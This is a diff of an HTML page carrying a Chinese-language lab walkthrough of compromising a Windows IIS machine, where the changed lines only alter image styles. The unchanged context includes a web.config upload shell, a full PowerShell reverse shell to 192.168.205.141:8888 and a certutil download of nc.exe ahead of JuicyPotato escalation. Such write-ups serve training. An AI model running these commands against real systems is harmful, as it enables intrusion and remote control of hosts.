@@ -845,11 +845,11 @@ Finished
 ===============================================================
 </pre></div>
 <p>扫到一个<code class="notranslate">/zoc.aspx</code>，去浏览器查看了一下，是一个上传页，并在注释发现了一个目录路径<code class="notranslate">/Subiditosdetono/</code>，当我们把目录加入网址会看到如下内容</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815"><img src="https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815"><img src="https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815" alt="image" style="max-width: 100%;"></a></p>
 <p>我们可以看到有一个<code class="notranslate">config</code>文件，当我们点击时会发现<strong>404</strong>无法访问，那我们还是回上传页试试能不能上传<strong>shell</strong></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2"><img src="https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2"><img src="https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2" alt="image" style="max-width: 100%;"></a></p>
 <p>不允许我们上传<code class="notranslate">.aspx</code>后缀的文件，根据之前访问<code class="notranslate">/Subiditosdetono/</code>看到有<code class="notranslate">config</code>文件，我们可以从中知道，可以上传<code class="notranslate">config</code>文件，我们去<a href="https://book.hacktricks.xyz/" rel="nofollow">hacktricks</a>搜索一下看<code class="notranslate">config</code>文件可不可以做<code class="notranslate">shell</code></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd"><img src="https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd"><img src="https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd" alt="image" style="max-width: 100%;"></a></p>
 <p>找到了一点有意思的东西，我们把它的示例<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config">复制</a>下来，上传运行</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ cat web.config 
@@ -919,7 +919,7 @@ end Function
 <span class="pl-s">&lt;%Response.write(<span class="pl-pds">"</span></span><span class="pl-k">&lt;</span><span class="pl-k">!</span>-<span class="pl-s"><span class="pl-pds">"</span>&amp;<span class="pl-pds">"</span></span>-<span class="pl-s"><span class="pl-pds">"</span>) %&gt;</span>
 <span class="pl-s">--&gt;</span>
 <span class="pl-s">        </span></pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc"><img src="https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc"><img src="https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc" alt="image" style="max-width: 100%;"></a></p>
 <p>弹个<strong>shell</strong>回来</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">powershell -nop -c <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$client</span> = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);<span class="pl-smi">$stream</span> = <span class="pl-smi">$client</span>.GetStream();[byte[]]<span class="pl-smi">$bytes</span> = 0..65535|%{0};while((<span class="pl-smi">$i</span> = <span class="pl-smi">$stream</span>.Read(<span class="pl-smi">$bytes</span>, 0, <span class="pl-smi">$bytes</span>.Length)) -ne 0){;<span class="pl-smi">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="pl-smi">$bytes</span>,0, <span class="pl-smi">$i</span>);<span class="pl-smi">$sendback</span> = (iex <span class="pl-smi">$data</span> 2&gt;&amp;1 | Out-String );<span class="pl-smi">$sendback2</span> = <span class="pl-smi">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="pl-smi">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="pl-smi">$sendback2</span>);<span class="pl-smi">$stream</span>.Write(<span class="pl-smi">$sendbyte</span>,0,<span class="pl-smi">$sendbyte</span>.Length);<span class="pl-smi">$stream</span>.Flush()};<span class="pl-smi">$client</span>.Close()<span class="pl-pds">"</span></span>
 
@@ -945,7 +945,7 @@ SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci<span cl
 SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
 </pre></div>
 <p>我们有 <code class="notranslate">SeImpersonatePrivilege</code>权限，所以我们可以使用 <strong><a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a></strong> 工具来提升权限。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7"><img src="https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7"><img src="https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7" alt="image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">PS C:<span class="pl-cce">\t</span>mp<span class="pl-k">&gt;</span> certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe
 <span class="pl-k">****</span>  En l<span class="pl-k">?</span>nea  <span class="pl-k">****</span>
   0000  ...
